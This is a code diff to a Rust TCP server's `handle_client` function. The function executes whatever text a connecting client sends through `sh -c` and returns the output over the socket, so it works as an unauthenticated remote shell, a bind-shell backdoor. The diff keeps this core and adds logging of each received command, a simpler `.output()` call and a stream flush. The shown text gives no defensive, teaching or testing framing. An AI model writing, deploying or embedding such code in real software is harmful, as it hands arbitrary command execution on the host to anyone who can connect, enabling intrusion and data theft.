@@ -7,22 +7,32 @@ fn handle_client(mut stream: TcpStream) {
     let mut buffer = [0; 512];
     loop {
         let nbytes = match stream.read(&mut buffer) {
-            Ok(n) if n == 0 => return,
+            Ok(n) if n == 0 => {
+                println!("Client disconnected");
+                return;
+            }
             Ok(n) => n,
-            Err(_) => return,
+            Err(_) => {
+                println!("Error reading from stream");
+                return;
+            },
         };
 
         let command = String::from_utf8_lossy(&buffer[..nbytes]);
+        println!("Received command: {}", command);
+
         let output = Command::new("sh")
             .arg("-c")
             .arg(command.trim())
             .stdout(Stdio::piped())
-            .spawn()
-            .expect("Failed to execute command")
-            .wait_with_output()
-            .expect("Failed to wait for command");
+            .output()
+            .expect("Failed to execute command");
 
+        // Send the output back to the client
         stream.write_all(&output.stdout).expect("Failed to write to stream");
+
+        // Flush the stream to ensure all data is sent
+        stream.flush().expect("Failed to flush stream");
     }
 }
 
